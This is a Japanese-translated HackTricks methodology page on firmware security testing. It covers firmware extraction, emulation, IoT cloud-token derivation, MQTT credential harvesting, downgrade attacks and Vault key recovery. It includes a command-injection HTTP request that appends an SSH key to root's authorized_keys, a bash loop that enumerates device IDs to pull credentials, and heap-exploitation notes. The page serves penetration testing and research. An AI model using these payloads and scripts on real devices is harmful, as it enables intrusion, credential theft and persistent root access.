# Firmware Analysis

{{#include ../../banners/hacktricks-training.md}}

## **Introduction**

### Related resources


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware は、hardware コンポーネントとユーザーが操作する software 間の通信を管理・促進することで、device が正しく動作できるようにする不可欠な software です。Firmware は permanent memory に保存されるため、device は電源投入直後から重要な命令にアクセスでき、最終的に operating system の起動へとつながります。Firmware の調査と、場合によっては変更を行うことは、security vulnerabilities を特定するうえで重要な手順です。<sup>[[2]](#references)[[3]](#references)</sup>

## **情報収集**

**情報収集** は、device の構成と使用されている technologies を理解するための重要な初期ステップです。このプロセスでは、以下のデータを収集します。

- CPU architecture と実行されている operating system
- Bootloader の詳細
- Hardware layout と datasheets
- Codebase の metrics と source の場所
- External libraries と license の種類
- Update の履歴と regulatory certifications
- Architecture と flow diagrams
- Security assessments と特定済みの vulnerabilities

この目的において、**open-source intelligence (OSINT)** tools は非常に有用です。また、利用可能な open-source software components を手動および自動の review processes で分析することも重要です。[Coverity Scan](https://scan.coverity.com) や [Semmle’s LGTM](https://lgtm.com/#explore) などの tools は、潜在的な問題の発見に利用できる無料の static analysis を提供します。

## **Firmware の取得**

Firmware はさまざまな方法で取得できますが、それぞれ complexity のレベルが異なります。

- Source（developers、manufacturers）から**直接**取得する
- 提供された instructions から**build**する
- Official support sites から**download**する
- hosted firmware files を探すために **Google dork** queries を利用する
- [S3Scanner](https://github.com/sa7mon/S3Scanner) などの tools を使って **cloud storage** に直接アクセスする
- man-in-the-middle techniques により **updates** を intercept する
- **UART**、**JTAG**、**PICit** などの connections を通じて device から**extract**する
- device communication 内の update requests を **sniff** する
- **hardcoded update endpoints** を特定して利用する
- Bootloader または network から **dump** する
- 他の方法がすべて失敗した場合、適切な hardware tools を使って storage chip を**取り外して読み取る**

### UART-only logs: flash 内の U-Boot env により root shell を強制する

UART RX が無視される場合（logs のみの場合）でも、**U-Boot environment blob** を offline で**編集**することで init shell を強制できます。<sup>[[6]](#references)</sup>

1. SOIC-8 clip と programmer（3.3V）を使って SPI flash を dump します。
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. U-Boot env partition を特定し、`bootargs` を編集して `init=/bin/sh` を含め、**U-Boot env CRC32** を blob に対して**再計算**します。
3. env partition のみを reflash して reboot します。UART 上に shell が表示されるはずです。

これは、bootloader shell が無効化されている一方で、外部 flash access により env partition が書き込み可能な embedded devices で有用です。

## Firmware の分析

**Firmware を取得した**ので、どのように扱うべきかを把握するために、Firmware に関する情報を extract する必要があります。そのために使用できるさまざまな tools があります。
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
それらのツールであまり見つからない場合は、`binwalk -E <bin>` を使用してイメージの **entropy** を確認してください。entropy が低い場合、暗号化されている可能性は低いです。entropy が高い場合は、暗号化されている可能性があります（または何らかの方法で圧縮されています）。

さらに、これらのツールを使用して **firmware 内に埋め込まれたファイル**を抽出できます:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

または [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) を使用してファイルを検査できます。

### ファイルシステムの取得

前述の `binwalk -ev <bin>` などのツールを使用すれば、**ファイルシステムを抽出**できているはずです。\
Binwalk は通常、ファイルシステムの種類にちなんだ **フォルダ**内に抽出します。通常、以下のいずれかです: squashfs、ubifs、romfs、rootfs、jffs2、yaffs2、cramfs、initramfs。

#### ファイルシステムの手動抽出

場合によっては、binwalk の signatures にファイルシステムの **magic byte** が含まれていないことがあります。この場合は、binwalk を使用してファイルシステムの offset を見つけ、バイナリから圧縮されたファイルシステムを **carve** し、以下の手順に従って種類に応じたファイルシステムを **手動で抽出**してください。
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
以下の **dd command** を実行して、Squashfs ファイルシステムをcarvingします。
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
また、以下のコマンドを実行することもできます。

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- squashfs（上記の例で使用）

`$ unsquashfs dir.squashfs`

その後、ファイルは "`squashfs-root`" directory に配置されます。

- CPIO archive files

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- jffs2 filesystems の場合

`$ jefferson rootfsfile.jffs2`

- NAND flash を使用する ubifs filesystems の場合

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Firmware の分析

Firmware を取得したら、その構造と潜在的な脆弱性を理解するために dissect することが不可欠です。このプロセスでは、さまざまな tools を使用して firmware image を分析し、価値のある data を抽出します。

### Initial Analysis Tools

binary file（`<bin>` と表記）の初期 inspection に使用する一連の commands を以下に示します。これらの commands は、file types の特定、strings の抽出、binary data の分析、partition および filesystem の詳細の把握に役立ちます。
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
イメージの暗号化状態を評価するには、`binwalk -E <bin>` で **entropy** を確認します。低い entropy は暗号化されていない可能性を示し、高い entropy は暗号化または圧縮されている可能性を示します。

**embedded files** を抽出するには、**file-data-carving-recovery-tools** のドキュメントや、ファイル検査用の **binvis.io** などの tools と resources が推奨されます。

### Filesystem の抽出

`binwalk -ev <bin>` を使用すると、通常は filesystem を抽出できます。多くの場合、filesystem の種類にちなんだ名前（例：squashfs、ubifs）の directory に抽出されます。ただし、**binwalk** が magic bytes の欠落により filesystem の種類を認識できない場合は、手動での抽出が必要です。これには、`binwalk` で filesystem の offset を特定し、その後 `dd` command を使用して filesystem を carve out します：
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
その後、ファイルシステムの種類（例: squashfs、cpio、jffs2、ubifs）に応じて、内容を手動で抽出するために異なるコマンドを使用します。

### ファイルシステム分析

ファイルシステムを抽出したら、security flaw の検索を開始します。安全でない network daemon、hardcoded credential、API endpoint、update server の機能、未コンパイルの code、startup script、オフライン分析用の compiled binary に注目します。

**主な場所**と検査対象には、以下が含まれます。

- ユーザー credential 用の **etc/shadow** と **etc/passwd**
- **etc/ssl** 内の SSL certificate と key
- 潜在的な脆弱性がないか確認するための configuration と script file
- さらなる分析用の embedded binary
- 一般的な IoT device の web server と binary

filesystem 内の機密情報や脆弱性の発見には、いくつかの tool が役立ちます。

- 機密情報の検索に使う [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) と [**Firmwalker**](https://github.com/craigz28/firmwalker)
- 包括的な firmware 分析に使う [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core)
- static および dynamic analysis に使う [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer)、[**ByteSweep**](https://gitlab.com/bytesweep/bytesweep)、[**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go)、[**EMBA**](https://github.com/e-m-b-a/emba)

### Compiled Binary の Security Check

filesystem 内で見つかった source code と compiled binary は、脆弱性がないか入念に調査する必要があります。Unix binary 用の **checksec.sh** や Windows binary 用の **PESecurity** などの tool により、exploit 可能な保護されていない binary を特定できます。

## 生成された URL token を介した cloud config と MQTT credential の収集

多くの IoT hub は、以下のような cloud endpoint から device ごとの configuration を取得します。<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

firmware analysis の過程で、`<token>` が hardcoded secret を使用して device ID から locally 生成されていることが判明する場合があります。例えば、以下のようになります。

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

この設計では、deviceId と STATIC_KEY を知っている誰もが URL を再構築して cloud config を取得できます。多くの場合、そこから plaintext の MQTT credential と topic prefix が明らかになります。

実際の workflow:

1) UART boot log から deviceId を抽出する

- 3.3V UART adapter（TX/RX/GND）を接続し、log を取得します。
```bash
picocom -b 115200 /dev/ttyUSB0
```
- cloud config URLパターンとbroker addressを出力している行を探します。例:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) firmware から STATIC_KEY と token algorithm を復元する

- バイナリを Ghidra/radare2 に読み込み、config path（"/pf/"）または MD5 の使用箇所を検索する。
- algorithm（例: MD5(deviceId||STATIC_KEY)）を確認する。
- Bash で token を導出し、digest を uppercase にする：
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) cloud config と MQTT credentials の収集

- URL を組み立て、curl で JSON を取得し、jq で parse して secrets を抽出する:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) プレーンテキストの MQTT と脆弱な topic ACLs を悪用する（存在する場合）

- 回収した認証情報を使用して maintenance topics を subscribe し、機密性の高いイベントを探す:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) 予測可能な device IDs を列挙する（大規模かつ authorization のもとで）

- 多くの ecosystem では、vendor OUI/product/type bytes に sequential suffix を付加しています。
- candidate IDs を反復処理し、tokens を導出して configs を programmatically 取得できます：
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
注意
- mass enumeration を試みる前に、必ず明示的な authorization を取得してください。
- 可能な場合は、target hardware を変更せずに secrets を復元するため、emulation または static analysis を優先してください。


firmware を emulation することで、デバイスの動作または個々の program の **dynamic analysis** が可能になります。このアプローチでは hardware や architecture への依存による問題に遭遇する場合がありますが、root filesystem または特定の binaries を、Raspberry Pi のような matching architecture と endianness を備えた device、あるいは事前構築済みの virtual machine に転送することで、さらなる testing を実施できます。

### 個々の Binaries の Emulation

単一の program を調査する場合、program の endianness と CPU architecture を特定することが重要です。

#### MIPS Architecture の例

MIPS architecture の binary を emulate するには、次の command を使用できます:
```bash
file ./squashfs-root/bin/busybox
```
また、必要なエミュレーションツールをインストールするには:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
MIPS（big-endian）では `qemu-mips` が使用され、little-endian バイナリには `qemu-mipsel` が選択されます。

#### ARM Architecture Emulation

ARM バイナリの場合もプロセスは同様で、`qemu-arm` emulator を使用して emulation を行います。

### Full System Emulation

[Firmadyne](https://github.com/firmadyne/firmadyne)、[Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) などのツールにより、firmware 全体の emulation が可能になり、プロセスを自動化して dynamic analysis を支援できます。

## Dynamic Analysis in Practice

この段階では、実機または emulation された device 環境を使用して analysis を行います。OS と filesystem への shell access を維持することが重要です。Emulation は hardware との interaction を完全には再現できない場合があるため、時折 emulation を再起動する必要があります。Analysis では filesystem を再確認し、公開されている webpages と network services を exploit し、bootloader の vulnerabilities を調査します。潜在的な backdoor vulnerabilities を特定するには、firmware integrity tests が重要です。

## Runtime Analysis Techniques

Runtime analysis では、gdb-multiarch、Frida、Ghidra などの tools を使用して、process または binary とその operating environment 上で interaction します。breakpoints の設定や fuzzing などの techniques によって vulnerabilities を特定します。

完全な debugger がない embedded targets では、**静的にリンクされた `gdbserver` を device にコピーし、remote から attach します**:<sup>[[6]](#references)</sup>
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

IoT hubでは、RF stackが**radio MCU**とLinux userland processの間で分割されていることがよくあります。実用的な workflowでは、次の経路を mappingします:<sup>[[8]](#references)</sup>

1. **RF frame**（無線上）
2. **controller-side parser**（radio MCU上）
3. Linuxへ転送される**serial/UART textまたはTLV protocol**（例: `/dev/tty*`）
4. メイン daemon内の**application dispatcher**
5. **protocol-specific handler / state machine**

この architectureにより、reversing targetは1つではなく2つになります。controllerがbinary radio frameを`Group,Command,arg1,arg2,...`のようなtextual protocolへ変換する場合、次を特定します:

- **message groups**とdispatch tables
- どのmessageが**network**から送信可能で、どれがcontroller自体から送信されるか
- 正確な**manufacturer-specific discriminator fields**（例: Zigbeeの`manufacturer_code`とcustom `cluster_command`）
- どのhandlerが**commissioning**、discovery、またはfirmware/model download phase中にのみ到達可能か

Zigbeeでは、pairing trafficをcaptureし、targetが依然としてdefault **Link Key** `ZigBeeAlliance09`に依存しているか確認します。依存している場合、commissioning trafficのsniffingによって**Network Key**が露出する可能性があります。Zigbee 3.0のinstall codesはこの露出を低減するため、テスト対象deviceが実際にそれらをenforceしているか確認してください。

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific Zigbee/ZCL commandsは、standardized clustersよりも優れたtargetになることがよくあります。これは、十分にbattle-testedされたvalidationが少ない**custom parsing code**やinternal **FSMs**へ入力されるためです。<sup>[[8]](#references)</sup>

実用的な workflow:

- command dispatcherをreverseし、**vendor-only handler**を見つける。
- **FSM state**、**event**、**check**、**action**、**next-state** tablesを復元する。
- auto-advanceする**transitional states**と、最終的にattacker-controlled stateをresetまたはfreeするretry/error branchesを特定する。
- buggy handlerが常にreachableだと仮定せず、daemonをvulnerable stateに置くために必要な正規のprotocol exchangesを確認する。

Timing-sensitive protocolでは、Python frameworkからのpacket replayは遅すぎる可能性があります。より信頼性の高い方法は、vendor-grade stackを使用して、real hardware（例: **nRF52840**）上でlegitimate deviceをemulateすることです。これにより、正しい**endpoints**、**attributes**、commissioning timingを公開できます。

### Fragmented-download bug class in embedded daemons

**fragmented blob/model/configuration downloads**では、次のようなfirmware bug classが繰り返し現れます:<sup>[[8]](#references)</sup>

1. **first fragment**（`offset == 0`）が`ctx->total_size`を保存し、`malloc(total_size)`を実行する。
2. 後続fragmentは、`packet_total_size >= offset + chunk_len`など、attacker-controlledな**packet-local** fieldsのみをvalidateする。
3. copyは、**original allocated size**との比較なしに`memcpy(&ctx->buffer[offset], chunk, chunk_len)`を使用する。

これにより、attackerは次を送信できます:

- 小さいdeclared total sizeでsmall heap allocationを強制する、最初のvalid fragment。
- **expected offset**と、より大きな`chunk_len`を持つ後続fragment。
- 新しいchecksを満たしながら、もともとallocatedされたbufferをoverflowさせる、偽造したpacket-local size。

vulnerable pathがcommissioning logicの背後にある場合、malformed fragmentsを送信する前にtargetを想定されるmodel-downloadまたはblob-download stateへ進めるため、十分な**device emulation**をexploitに含める必要があります。

### Protocol-driven `free()` triggers

embedded daemonでは、heap metadata exploitationをtriggerする最も簡単な方法は、"wait for cleanup"ではなく、protocol自身の**error handling**を**force**することです:<sup>[[8]](#references)</sup>

- malformed follow-up fragmentsを送信し、FSMを**retry**または**error** statesへ進める。
- retry thresholdを超過させ、daemonに**reset context**を実行させてcorrupted bufferをfreeする。
- この予測可能な`free()`を使用して、processが無関係な理由でcrashする前にallocator-side primitivesをtriggerする。

これは、embedded Linuxの**musl/uClibc/dlmalloc-like** allocatorsに対して特に有用です。chunk metadataのcorruptionにより、unlink/unbin logicをwrite primitiveへ変換できるためです。安定したpatternは、実際のbin pointersを直ちに上書きしてprocessをcrashさせるのではなく、**size field**をcorruptし、overflowed buffer内にstageした**fake chunks**へallocator traversalをredirectすることです。

## Binary Exploitation and Proof-of-Concept

特定したvulnerabilityのPoCを開発するには、target architectureへの深い理解と、lower-level languagesでのprogrammingが必要です。embedded systemsではbinary runtime protectionsはまれですが、存在する場合はReturn Oriented Programming (ROP)などのtechniquesが必要になることがあります。

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibcはglibcと同様のfastbinsを使用します。後続のlarge allocationによって`__malloc_consolidate()`がtriggerされる可能性があるため、fake chunkはchecks（妥当なsize、`fd = 0`、および周囲のchunkが"in use"と認識されること）を通過する必要があります。<sup>[[6]](#references)</sup>
- **Non-PIE binaries under ASLR:** ASLRが有効でも、main binaryが**non-PIE**なら、binary内の`.data/.bss` addressesはstableです。すでにvalid heap chunk headerに似ているregionをtargetにして、fastbin allocationを**function pointer table**上へ配置できます。
- **Parser-stopping NUL:** JSONがparseされる場合、payload中の`\x00`によってparsingを停止させつつ、後続のattacker-controlled bytesをstack pivot/ROP chain用に保持できます。
- **Shellcode via `/proc/self/mem`:** `open("/proc/self/mem")`、`lseek()`、`write()`を呼び出すROP chainによって、known mappingへexecutable shellcodeを配置し、そこへjumpできます。

## Prepared Operating Systems for Firmware Analysis

[AttifyOS](https://github.com/adi0x90/attifyos)や[EmbedOS](https://github.com/scriptingxss/EmbedOS)などのoperating systemsは、firmware security testing用のpre-configured environmentsを提供し、必要なtoolsを備えています。

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOSは、Internet of Things (IoT) devicesのsecurity assessmentとpenetration testingを支援することを目的としたdistroです。必要なtoolsがloadedされたpre-configured environmentを提供することで、多くの時間を節約できます。
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): firmware security testing toolsがpreloadedされた、Ubuntu 18.04ベースのembedded security testing operating systemです。

## Firmware Downgrade Attacks & Insecure Update Mechanisms

vendorがfirmware imagesのcryptographic signature checksを実装している場合でも、**version rollback (downgrade) protectionは頻繁に省略されます**。bootまたはrecovery-loaderがembedded public keyによってsignatureのみをverifyし、flash対象imageの*version*（またはmonotonic counter）を比較しない場合、attackerは**valid signatureが付いた古いvulnerable firmware**を正規にinstallでき、patch済みのvulnerabilityを再び導入できます。<sup>[[4]](#references)</sup>

一般的なattack workflow:

1. **古いsigned imageを取得する**
* vendorのpublic download portal、CDN、またはsupport siteから取得する。
* companion mobile/desktop applicationsからextractする（例: Android APK内の`assets/firmware/`）。
* VirusTotal、Internet archives、forumsなどのthird-party repositoriesからretrieveする。
2. 公開されているupdate channelを介してimageをdeviceへ**uploadまたはserveする**:
* Web UI、mobile-app API、USB、TFTP、MQTTなど。
* 多くのconsumer IoT devicesは、Base64-encoded firmware blobsを受け付け、server-sideでdecodeしてrecovery/upgradeをtriggerする*unauthenticated* HTTP(S) endpointsを公開しています。
3. downgrade後、新しいreleaseでpatchされたvulnerabilityをexploitする（例: 後から追加されたcommand-injection filter）。
4. persistenceを取得したら、detectionを避けるためにlatest imageへ戻すか、updatesをdisableする。

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
脆弱な（downgradeされた）firmwareでは、`md5`パラメータがsanitisationなしでshell commandに直接連結されるため、任意のcommandをinjectionできます（ここでは、SSH key-based root accessを有効化できます）。後のfirmware versionではbasicなcharacter filterが導入されましたが、downgrade protectionがないため、この修正は意味を成しません。<sup>[[4]](#references)</sup>

### Mobile AppsからのFirmwareのExtract

多くのvendorは、companion mobile application内にfull firmware imageをbundleしています。これは、appがBluetooth/Wi-Fi経由でdeviceをupdateできるようにするためです。これらのpackageは通常、`assets/fw/`や`res/raw/`などのpath配下に、暗号化されていない状態でAPK/APEX内に保存されています。`apktool`、`ghidra`、あるいは単純な`unzip`などのtoolを使用すれば、physical hardwareに触れることなくsigned imageをpullできます。<sup>[[4]](#references)</sup>
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### A/B slot設計におけるupdater限定のanti-rollback bypass

一部のvendorは、anti-downgrade **ratchet**を実装していますが、それが*updater*のlogic内だけに存在する場合があります（例: CAN経由のUDS routine、recovery command、userspace OTA agent）。後段の**bootloader**がimageのsignature/CRCのみをチェックし、partition tableまたはslot metadataを信頼する場合、rollback protectionは依然としてbypassできます。<sup>[[7]](#references)</sup>

典型的な弱い設計:

- Firmware metadataにversion descriptorと**security ratchet** / monotonic counterの両方が含まれている。
- updaterはimageのratchetをpersistent storageに保存された値と比較し、古いsigned imageを拒否する。
- bootloaderはそのratchetを**parseせず**、header、CRC、signatureのみをverifyしてselected slotをbootする。
- Slot activationはpartition tableまたはper-slot generation counterに別途保存され、validatedされた正確なfirmware digestに対して**cryptographically bound**されていない。

これにより、dual-slot systemで**validate-one-image / boot-another-image** primitiveが成立します。attackerが、current signed imageを使ってupdaterにslot Bをnext boot targetとしてmarkさせ、その後reboot前にslot Bをoverwriteできる場合、bootloaderはすでにcommitされたslot metadataのみを信頼するため、downgraded imageをbootする可能性があります。

一般的なabuse pattern:

1. **current signed** firmwareをpassive slotにuploadし、通常のvalidation/switch routineを実行して、そのlayoutで該当slotをnext activeとしてmarkする。
2. **まだrebootしない**。同じsession内でslot-preparation/erase routineに再度入る。
3. staleなboot-stateまたはstaleなslot-selection logicをabuseし、updaterに直前にpromoteされた**同じphysical slot**をeraseさせる。
4. **olderだが依然としてsigned**なfirmwareをそのslotにwriteする。
5. ratchetをenforceするvalidation routineをskipし、直接rebootする。
6. bootloaderはpromoteされたslotをselectし、signature/integrityのみをverifyしてold imageをbootする。

A/B update implementationをreverseするときに確認するポイント:

- 成功したswitch後にrefreshされない**boot-time flags**からslot selectionがderiveされている。
- `prepare_passive_slot()`のようなroutineが、**current committed layout**ではなくstale stateに基づいてslotをeraseする。
- `part_write_layout()`のようなfunctionが**generation counter** / active flagだけをincrementし、validated image hashを保存していない。
- ratchet checkがuserspaceまたはupdater codeに実装されているが、ROM / bootloader / secure boot stageには**実装されていない**。
- Eraseまたはrecovery routineが、slotのcontentをremoveしてrewriteした後も、そのslotをbootableとしてmarkしたままにする。

### Update Logicを評価するためのChecklist

* *update endpoint*のtransport/authenticationは十分に保護されているか（TLS + authentication）?
* Flashing前にdeviceは**version number**または**monotonic anti-rollback counter**をcompareしているか?
* Imageはsecure boot chain内でverifyされているか（例: ROM codeがsignatureをcheckする）?
* **bootloaderはupdaterと同じratchetをenforce**しているか、それともsignature/CRCのみをcheckしているか?
* Slot activation metadataは**validated firmware digest/versionにbound**されているか、それともpromotion後にslotをmodifyできるか?
* Slot switchが成功した後、deviceは強制的にrebootされるか、それとも同じsession内で後続のupdate/erase routineに引き続き到達できるか?
* Userland codeは追加のsanity check（例: 許可されたpartition map、model number）を実行しているか?
* *partial*または*backup* update flowは同じvalidation logicを再利用しているか?

> 💡  上記のいずれかが欠けている場合、そのplatformはrollback attackに対してvulnerableである可能性が高いです。

## Vulnerable firmware to practice

Firmwareのvulnerability discoveryをpracticeするには、以下のvulnerable firmware projectをstarting pointとして使用します。

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Embedded KMS/Vault stateからfirmware decryption keyをrecoverする

Update imageがsmall plaintext metadataとlarge high-entropy blobを混在させている場合、何かをbrute-forceする前にcontainer triageを行います:<sup>[[1]](#references)</sup>

- `hexdump`、`xxd`、`strings -tx`、`base64 -d`、`binwalk -E`でheader、offset、line boundaryをdumpする。
- `Salted__`は通常OpenSSL `enc` formatを意味します。次の8 bytesがsaltで、残りのbytesがciphertextです。
- 正確に`256` bytesへdecodeされるBase64 fieldは、random firmware password/session keyをwrapしているRSA-2048 ciphertextを見ている強いhintです。
- 同じfile内のdetached PGP materialはauthenticityのみをprotectしていることが多く、confidentiality mechanismだと想定しないでください。

Static key hunting（`grep`、`strings`、PEM/PGP search）が失敗した場合、private keyのsearchだけを行うのではなく、**operational decrypt path**をreverseします。

- updater / management binaryをdecompileし、encrypted blobを読む処理、そのblobをunwrapするhelper/API、そしてrequestするlogical key nameをtraceする。
- Extractしたroot filesystemから、KMS state（`vault/`、`transit/`、`pkcs11`、`keystore`、`sealed-secrets`）に加え、unit fileとinit scriptをsearchする。
- Plaintextの`vault operator unseal ...`、recovery key、bootstrap token、またはlocal KMS auto-unseal scriptは、private-key materialと同等に扱う。

Applianceがoriginal Vault binaryとstorage backendをshippingしている場合、Vault internalsをreimplementするよりも、そのenvironmentをreplayする方が通常は容易です:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
cloned KMS の root 権限で:

- transit keys を isolated clone 内でのみ exportable にする: `vault write transit/keys/<name>/config exportable=true`
- unwrap key を export する: `vault read transit/export/encryption-key/<name>`
- 復元した RSA key を、KMS が使用した正確な padding/hash の組み合わせで試す。PKCS#1 v1.5 decrypt の失敗と、デフォルトの OAEP decrypt の失敗だけでは、key が間違っていることの証明には **ならない**。Vault-backed の flow の多くは SHA-256 を使用する OAEP を使う一方、一般的な library のデフォルトは SHA-1 である。
- payload が `Salted__` で始まる場合は、AES-CBC decrypt を試す前に、vendor の OpenSSL KDF (`EVP_BytesToKey`、legacy appliance では MD5 が使われることが多い) を正確に再現する。

これにより、「encrypted firmware」はより一般的な問題に変わる。つまり、**appliance 側の operational key を復元し、その後に正確な unwrap + KDF parameter を offline で再現する**という問題である。

## トレーニングと資格

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude で Firmware を Crack する: Senior-Level Skill、Junior-Level Autonomy](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [放棄された hardware の zero day を Exploiting – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [$20 の Smart Device から Home への Access を得た方法](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Tesla Wall Connector を charge port connector から Exploiting - Part 2: anti-downgrade の bypass](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Make it Blink: Philips Hue Bridge の Over-the-Air Exploitation](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)

{{#include ../../banners/hacktricks-training.md}}
